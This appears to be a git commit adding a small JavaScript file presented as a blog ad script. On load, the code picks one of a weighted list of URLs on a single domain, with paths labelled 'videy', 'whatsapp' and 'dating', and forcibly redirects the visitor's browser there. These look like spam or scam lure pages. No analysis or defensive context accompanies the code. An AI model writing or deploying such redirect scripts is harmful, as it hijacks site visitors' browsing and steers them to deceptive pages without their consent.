4e7eb6df89acf808a29f96bb5471c9d778a6793b
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2025-08-18 11:50:57 +0700

    Create ablogadsenlangsungg3.js

---
+++ ablogadsenlangsungg3.js
@@ -0,0 +1,30 @@
+var dataUrl = [
+
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/videy',
+'https://billimiters.ayoah.com/whatsapp',
+'https://billimiters.ayoah.com/whatsapp',
+'https://billimiters.ayoah.com/whatsapp',
+'https://billimiters.ayoah.com/whatsapp',
+'https://billimiters.ayoah.com/dating',
+'https://billimiters.ayoah.com/dating',
+'https://billimiters.ayoah.com/dating',
+'https://billimiters.ayoah.com/dating',
+'https://billimiters.ayoah.com/dating',
+'https://billimiters.ayoah.com/dating',
+'https://billimiters.ayoah.com/dating',
+'https://billimiters.ayoah.com/dating',
+'https://billimiters.ayoah.com/dating'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
